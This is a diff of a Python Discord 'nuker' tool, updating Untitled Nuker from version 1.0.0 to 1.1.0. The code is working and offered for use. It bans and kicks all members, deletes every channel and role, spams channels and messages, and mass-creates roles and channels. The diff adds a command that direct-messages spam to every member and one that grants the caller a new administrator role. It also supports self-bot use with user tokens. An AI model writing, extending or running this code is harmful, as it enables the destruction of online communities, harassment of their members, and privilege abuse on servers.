@@ -12,25 +12,41 @@ from colorama import Fore
 colorama.init()
 os.system('cls')
 
-version = "1.0.0"
+version = "1.1.0"
 msgs = {"info": f"{Fore.WHITE}[{Fore.CYAN}i{Fore.WHITE}]",
         "+": f"{Fore.WHITE}[{Fore.CYAN}+{Fore.WHITE}]",
         "error": f"{Fore.WHITE}[{Fore.RED}e{Fore.WHITE}]",
         "input": f"{Fore.WHITE}{Fore.CYAN}>>{Fore.WHITE}"}
 
 async def msg_delete(ctx):
+
+    """
+    Trying to delete activation message
+    """
+
     try:
         await ctx.message.delete()
     except:
         print(f"{msgs['error']}Can't delete your message")
 
 def userOrBot():
+
+    """
+    Returns True if token belongs to user's account
+    Returns False if token belongs to bot's account
+    """
+
     if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
         return True # Returns False if user is bot
     else:
         return False
 
 def checkVersion():
+
+    """
+    Checking for new versions on github
+    """
+
     try:
         res = requests.get("https://api.github.com/repos/ICEGXG/UntitledNuker/releases/latest", timeout=2)
         if res.status_code == 200:
@@ -63,6 +79,11 @@ print(f'{Fore.CYAN}\n\n                  __  __  __   __  ______ __  ______ __  
                         f"{Fore.WHITE}                            Version: {Fore.CYAN}{version} {checkVersion()}\n"
                         f"{Fore.WHITE}                            GitHub: {Fore.CYAN}https://github.com/ICEGXG/UntitledNuker\n\n{Fore.WHITE}")
 
+"""
+Fetching prefix, token and owner ID's from config
+If there's no config requests is from the user
+"""
+
 try:
     with open(f"config.json", encoding='utf8') as data:
         config = json.load(data)
@@ -87,7 +108,8 @@ except FileNotFoundError:
         json.dump(config, data, indent=2)
     print(f"{msgs['info']}Created config.json")
 
-bot = commands.Bot(command_prefix=prefix, self_bot=userOrBot(), intents=discord.Intents.all())
+activity = discord.Game(name=f"Untitled Nuker v{version}")
+bot = commands.Bot(command_prefix=prefix, self_bot=userOrBot(), activity=activity, intents=discord.Intents.all())
 bot.remove_command("help")
 
 @bot.event
@@ -122,18 +144,20 @@ async def help(ctx):
     embed.add_field(name="Ban everyone", value=f"`{p}2`", inline=False)
     embed.add_field(name="Kick everyone", value=f"`{p}3`", inline=False)
     embed.add_field(name="Rename everyone", value=f"`{p}4 <new nickname>`", inline=False)
-    embed.add_field(name="Spam to all channels", value=f"`{p}5 <amount> <text>`", inline=False)
-    embed.add_field(name="Spam to current channel", value=f"`{p}6 <amount> <text>`", inline=False)
-    embed.add_field(name="Delete all channels", value=f"`{p}`7", inline=True)
-    embed.add_field(name="Delete all roles", value=f"`{p}8`", inline=True)
+    embed.add_field(name="DM everyone", value=f"`{p}5 <message>`", inline=False)
+    embed.add_field(name="Spam to all channels", value=f"`{p}6 <amount> <text>`", inline=False)
+    embed.add_field(name="Spam to current channel", value=f"`{p}7 <amount> <text>`", inline=False)
+    embed.add_field(name="Delete all channels", value=f"`{p}`8", inline=True)
+    embed.add_field(name="Delete all roles", value=f"`{p}9`", inline=True)
     embed.add_field(name="\u200b", value="\u200b", inline=True)
-    embed.add_field(name="Spam with channels", value=f"`{p}9 <amount> <name>`", inline=True)
-    embed.add_field(name="Spam with roles", value=f"`{p}10 <amount> <name>`", inline=True)
+    embed.add_field(name="Spam with channels", value=f"`{p}10 <amount> <name>`", inline=True)
+    embed.add_field(name="Spam with roles", value=f"`{p}11 <amount> <name>`", inline=True)
     embed.add_field(name="\u200b", value="\u200b", inline=True)
-    embed.add_field(name="Edit server icon", value=f"`{p}11`\n`Image is attachment`", inline=True)
-    embed.add_field(name="Edit server name", value=f"`{p}12 <name>`", inline=True)
+    embed.add_field(name="Edit server icon", value=f"`{p}12`\n`Image is attachment`", inline=True)
+    embed.add_field(name="Edit server name", value=f"`{p}13 <name>`", inline=True)
+    embed.add_field(name="Get admin", value=f"`{p}14 <name of role>`", inline=False)
     embed.add_field(name="\u200b", value="\u200b", inline=True)
-    embed.add_field(name="Revive", value=f"`{p}13 <guild id>`\n`Creating 1 text channel on server if you deleted all`\n`Execute in DM`", inline=False)
+    embed.add_field(name="Revive", value=f"`{p}15 <guild id>`\n`Creating 1 text channel on server if you deleted all`\n`Execute in DM`", inline=False)
     embed.add_field(name="\u200b\nInfo", value="**Untitled Nuker**\nMade by ICE#4449\nGitHub: https://github.com/ICEGXG/UntitledNuker\n", inline=False)
     await ctx.message.author.send(embed=embed)
 
@@ -156,11 +180,11 @@ async def nuke(ctx, ban: bool=True, text="Untitled Nuker"):
             if str(m.id) not in owners:
                 try:
                     await m.ban()
-                    print(f"{msgs['+']} Banned {m.name}")
+                    print(f"{msgs['+']} Banned {m}")
                 except:
-                    print(f"{msgs['error']} can't ban {m.name}")
+                    print(f"{msgs['error']} can't ban {m}")
             else:
-                print(f"{msgs['info']} {m.name} is owner")
+                print(f"{msgs['info']} {m} is owner")
     
     for r in ctx.guild.roles:
         try:
@@ -176,11 +200,11 @@ async def banEveryone(ctx):
         if str(m.id) not in owners:
             try:
                 await m.ban()
-                print(f"{msgs['+']} Banned {m.name}")
+                print(f"{msgs['+']} Banned {m}")
             except:
-                print(f"{msgs['error']} can't ban {m.name}")
+                print(f"{msgs['error']} can't ban {m}")
         else:
-            print(f"{msgs['info']} {m.name} is owner")
+            print(f"{msgs['info']} {m} is owner")
 
 @bot.command(name='3', aliases=["ke"])
 async def kickEveryone(ctx):
@@ -189,26 +213,39 @@ async def kickEveryone(ctx):
         if str(m.id) not in owners:
             try:
                 await m.kick()
-                print(f"{msgs['+']} Kicked {m.name}")
+                print(f"{msgs['+']} Kicked {m}")
             except:
-                print(f"{msgs['error']} can't kick {m.name}")
+                print(f"{msgs['error']} can't kick {m}")
         else:
-            print(f"{msgs['info']} {m.name} is owner")
+            print(f"{msgs['info']} {m} is owner")
 
 @bot.command(name="4", aliases=["chen"])
-async def renameEveryone(ctx, *, name="UntitledNuker"):
+async def renameEveryone(ctx, *, name="Untitled Nuker"):
     await msg_delete(ctx)
     for m in ctx.guild.members:
         if str(m.id) not in owners:
             try:
                 await m.edit(nick=name)
-                print(f"{msgs['+']} Changed {m.name}'s nickname")
+                print(f"{msgs['+']} Changed {m}'s nickname")
             except:
-                print(f"{msgs['error']} Can't edit {m.name}'s nickname")
+                print(f"{msgs['error']} Can't change {m}'s nickname")
         else:
             print(f"{msgs['info']} {m.name} is owner")
 
-@bot.command(name="5", aliases=["sa"])
+@bot.command(name="5", aliases=["dme"])
+async def dmEveryone(ctx, *, msg="Untitled Nuker"):
+    await msg_delete(ctx)
+    for m in ctx.guild.members:
+        if str(m.id) not in owners:
+            try:
+                await m.send(msg)
+                print(f"{msgs['+']} Message sent to {m}")
+            except:
+                print(f"{msgs['error']} Can't send message to {m}")
+        else:
+            print(f"{msgs['info']} {m.name} is owner")
+
+@bot.command(name="6", aliases=["sa"])
 async def spamToAllChannels(ctx, amount: int=50, *, text="@everyone Untitled Nuker"):
     await msg_delete(ctx)
     for i in range(amount):
@@ -219,7 +256,7 @@ async def spamToAllChannels(ctx, amount: int=50, *, text="@everyone Untitled Nuk
             except:
                 print(f"{msgs['error']} Can't send message to {ch}")
 
-@bot.command(name='6', aliases=["sc"])
+@bot.command(name='7', aliases=["sc"])
 async def spamToCurrentChannel(ctx, amount: int=50, *, text="@everyone Untitled Nuker"):
     await msg_delete(ctx)
     for i in range(amount):
@@ -229,7 +266,7 @@ async def spamToCurrentChannel(ctx, amount: int=50, *, text="@everyone Untitled 
         except:
             print(f"{msgs['error']} Can't send message to {ctx.channel}")
 
-@bot.command(name='7', aliases=["dch"])
+@bot.command(name='8', aliases=["dch"])
 async def deleteAllChannels(ctx):
     await msg_delete(ctx)
     for ch in ctx.guild.channels:
@@ -239,7 +276,7 @@ async def deleteAllChannels(ctx):
         except:
             print(f"{msgs['error']} Can't delete {ch}")
 
-@bot.command(name='8', aliases=["dr"])
+@bot.command(name='9', aliases=["dr"])
 async def deleteAllRoles(ctx):
     await msg_delete(ctx)
     for r in ctx.guild.roles:
@@ -249,7 +286,7 @@ async def deleteAllRoles(ctx):
         except:
             print(f"{msgs['error']} Can't delete {r}")
     
-@bot.command(name="9", aliases=["sch"])
+@bot.command(name="10", aliases=["sch"])
 async def spamWithChannels(ctx, amount: int=25, *, name="Untitled Nuker"):
     await msg_delete(ctx)
     for i in range(amount):
@@ -259,7 +296,7 @@ async def spamWithChannels(ctx, amount: int=25, *, name="Untitled Nuker"):
         except:
             print(f"{msgs['error']} Can't create channel")
 
-@bot.command(name="10", aliases=["sr"])
+@bot.command(name="11", aliases=["sr"])
 async def spamWithRoles(ctx, amount: int=25, *, name="Untitled Nuker"):
     await msg_delete(ctx)
     for i in range(amount):
@@ -269,7 +306,7 @@ async def spamWithRoles(ctx, amount: int=25, *, name="Untitled Nuker"):
         except:
             print(f"{msgs['error']} Can't create role")
 
-@bot.command(name='11', aliases=["si"])
+@bot.command(name='12', aliases=["si"])
 async def editServerIcon(ctx):
     await msg_delete(ctx)
     if ctx.message.attachments:
@@ -283,7 +320,7 @@ async def editServerIcon(ctx):
     except:
         print(f"{msgs['error']} Can't change server icon")
 
-@bot.command(name='12', aliases=["sn"])
+@bot.command(name='13', aliases=["sn"])
 async def editServerName(ctx, *, name="Untitled Nuker"):
     await msg_delete(ctx)
     try:
@@ -292,7 +329,18 @@ async def editServerName(ctx, *, name="Untitled Nuker"):
     except:
         print(f"{msgs['error']} Can't change server name")
 
-@bot.command(name='13', aliases=["rg"])
+@bot.command(name="14", aliases=["ga"])
+async def getAdmin(ctx, *, rolename="Untitled Nuker"):
+    await msg_delete(ctx)
+    try:
+        perms = discord.Permissions(administrator=True)
+        role = await ctx.guild.create_role(name=rolename, permissions=perms)
+        await ctx.message.author.add_roles(role)
+        print(f"{msgs['+']} Added admin role to {ctx.message.author}")
+    except Exception as e:
+        print(f"{msgs['error']} Can't add admin role to {ctx.message.author}")
+
+@bot.command(name='15', aliases=["rg"])
 @commands.dm_only()
 async def reviveGuild(ctx, guildId: int=None):
     if guildId:
@@ -301,7 +349,7 @@ async def reviveGuild(ctx, guildId: int=None):
             await guild.create_text_channel(name="Untitled Nuker")
             print(f"{msgs['+']} Revived {guild}")
         except:
-            print(f"{msgs['error']} Can't revive {guild} :(")
+            print(f"{msgs['error']} Can't revive {guild}")
 
 try:
     bot.run(token, bot=not userOrBot())
